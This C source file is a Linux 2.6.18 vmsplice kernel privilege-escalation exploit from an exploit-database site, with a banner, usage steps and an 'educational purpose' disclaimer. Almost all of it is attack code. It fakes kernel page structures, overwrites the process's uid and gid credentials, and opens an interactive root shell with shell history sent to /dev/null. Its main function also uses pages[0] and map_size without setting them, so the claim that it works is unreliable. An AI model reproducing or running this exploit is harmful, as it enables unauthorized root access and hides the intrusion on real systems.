/*
 *
 *
 * 1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                         
 * 0     _                   __           __       __                     1
 * 1   /' \            __  /'__`\        /\ \__  /'__`\                   0
 * 0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
 * 1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
 * 0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
 * 1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
 * 0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
 * 1                  \ \____/ >> Exploit database separated by exploit   0
 * 0                   \/___/          type (local, remote, DoS, etc.)    1
 * 1                                                                      0
 * 0  2.6.18 Modified By CrosS                                            1
 * 1                                                                      0
 * 0  Linux 2011                                                          1
 * 1                                                                      0
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1
 *
 * Linux 2.6.18 Previously Coded by "Angel Injection" , couple of thanks for this, but
 *
 * it had errors while compiling, so this is modified version of this exploit
 *
 * working fine . Usage is given below..
 *
 * gcc -o exploit exploit.c
 * chmod 777 exploit
 * ./exploit
 *
 * Greetz: r0073r( 1337day.com ),r4dc0re,side^effects and all members of 1337day Team ) ..... & allmembers of r00tw0rm.com ( RW ) .. )
 *
 * Submit Your Exploit at Submit@1337day.com | mr.inj3ct0r@gmail.com
 *
 * For Educational purpose Only))
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <limits.h>
#include <signal.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <asm/page.h>
#define __KERNEL__
#include <asm/unistd.h>

#define PIPE_BUFFERS   16
#define PG_compound   14
#define uint      unsigned int
#define static_inline   static inline __attribute__((always_inline))
#define STACK(x)   (x + sizeof(x) - 40)

struct page {
   unsigned long flags;
   int count;
   int mapcount;
   unsigned long private;
   void *mapping;
   unsigned long index;
   struct { long next, prev; } lru;
};

void   exit_code();
char   exit_stack[1024 * 1024];

void   die(char *msg, int err)
{
   printf(err ? "[-] %s: %s\n" : "[-] %s\n", msg, strerror(err));
   fflush(stdout);
   fflush(stderr);
   exit(1);
}

#if defined (__i386__)

#ifndef __NR_vmsplice
#define __NR_vmsplice   316
#endif

#define USER_CS      0x73
#define USER_SS      0x7b
#define USER_FL      0x246

static_inline
void   exit_kernel()
{
   __asm__ __volatile__ (
   "movl %0, 0x10(%%esp) ;"
   "movl %1, 0x0c(%%esp) ;"
   "movl %2, 0x08(%%esp) ;"
   "movl %3, 0x04(%%esp) ;"
   "movl %4, 0x00(%%esp) ;"
   "iret"
   : : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),
       "i" (USER_CS), "r" (exit_code)
   );
}

static_inline
void *   get_current()
{
   unsigned long curr;
   __asm__ __volatile__ (
   "movl %%esp, %%eax ;"
   "andl %1, %%eax ;"
   "movl (%%eax), %0"
   : "=r" (curr)
   : "i" (~8191)
   );
   return (void *) curr;
}

#elif defined (__x86_64__)

#ifndef __NR_vmsplice
#define __NR_vmsplice   278
#endif

#define USER_CS      0x23
#define USER_SS      0x2b
#define USER_FL      0x246

static_inline
void   exit_kernel()
{
   __asm__ __volatile__ (
   "swapgs ;"
   "movq %0, 0x20(%%rsp) ;"
   "movq %1, 0x18(%%rsp) ;"
   "movq %2, 0x10(%%rsp) ;"
   "movq %3, 0x08(%%rsp) ;"
   "movq %4, 0x00(%%rsp) ;"
   "iretq"
   : : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),
       "i" (USER_CS), "r" (exit_code)
   );
}

static_inline
void *   get_current()
{
   unsigned long curr;
   __asm__ __volatile__ (
   "movq %%gs:(0), %0"
   : "=r" (curr)
   );
   return (void *) curr;
}

#else
#error "unsupported arch"
#endif

#if defined (_syscall4)
#define __NR__vmsplice   __NR_vmsplice
_syscall4(
   long, _vmsplice,
   int, fd,
   struct iovec *, iov,
   unsigned long, nr_segs,
   unsigned int, flags)

#else
#define _vmsplice(fd,io,nr,fl)   syscall(__NR_vmsplice, (fd), (io), (nr), (fl))
#endif

static uint uid, gid;

void   kernel_code()
{
   int   i;
   uint   *p = get_current();

   for (i = 0; i < 1024-13; i++) {
      if (p[0] == uid && p[1] == uid &&
          p[2] == uid && p[3] == uid &&
          p[4] == gid && p[5] == gid &&
          p[6] == gid && p[7] == gid) {
         p[0] = p[1] = p[2] = p[3] = 0;
         p[4] = p[5] = p[6] = p[7] = 0;
         p = (uint *) ((char *)(p + 8) + sizeof(void *));
         p[0] = p[1] = p[2] = ~0;
         break;
      }
      p++;
   }   

   exit_kernel();
}

void   exit_code()
{
   if (getuid() != 0)
      die("wtf", 0);

   printf("[+] root\n");
   putenv("HISTFILE=/dev/null");
   execl("/bin/bash", "bash", "-i", NULL);
   die("/bin/bash", errno);
}

int   main(int argc, char *argv[])
{
   int      pi[2];
   size_t      map_size;
   char *      map_addr;
   struct iovec   iov;
   struct page *   pages[5];

   uid = getuid();
   gid = getgid();
   setresuid(uid, uid, uid);
   setresgid(gid, gid, gid);

   if (!uid || !gid)
      die("!@#$", 0);

   /*****/
   pages[1] = pages[0] + 1;

   map_addr = mmap(pages[0], map_size, PROT_READ | PROT_WRITE,
                   MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (map_addr == MAP_FAILED)
      die("mmap", errno);

   memset(map_addr, 0, map_size);
   printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
   printf("[+] page: 0x%lx\n", pages[0]);
   printf("[+] page: 0x%lx\n", pages[1]);

   pages[0]->flags    = 1 << PG_compound;
   pages[0]->private  = (unsigned long) pages[0];
   pages[0]->count    = 1;
   pages[1]->lru.next = (long) kernel_code;

   /*****/
   pages[2] = *(void **) pages[0];
   pages[3] = pages[2] + 1;

   map_addr = mmap(pages[2], map_size, PROT_READ | PROT_WRITE,
                   MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (map_addr == MAP_FAILED)
      die("mmap", errno);

   memset(map_addr, 0, map_size);
   printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
   printf("[+] page: 0x%lx\n", pages[2]);
   printf("[+] page: 0x%lx\n", pages[3]);

   pages[2]->flags    = 1 << PG_compound;
   pages[2]->private  = (unsigned long) pages[2];
   pages[2]->count    = 1;
   pages[3]->lru.next = (long) kernel_code;

   /*****/
   map_addr = mmap(pages[4], map_size, PROT_READ | PROT_WRITE,
                   MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (map_addr == MAP_FAILED)
      die("mmap", errno);
   memset(map_addr, 0, map_size);
   printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
   printf("[+] page: 0x%lx\n", pages[4]);

   /*****/
   map_addr = mmap(NULL, map_size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (map_addr == MAP_FAILED)
      die("mmap", errno);

   memset(map_addr, 0, map_size);
   printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
   
   /*****/
   if (pipe(pi) < 0) die("pipe", errno);
   close(pi[0]);

   iov.iov_base = map_addr;
   iov.iov_len  = ULONG_MAX;

   signal(SIGPIPE, exit_code);
   _vmsplice(pi[1], &iov, 1, 0);
   die("vmsplice", errno);
   return 0;
}
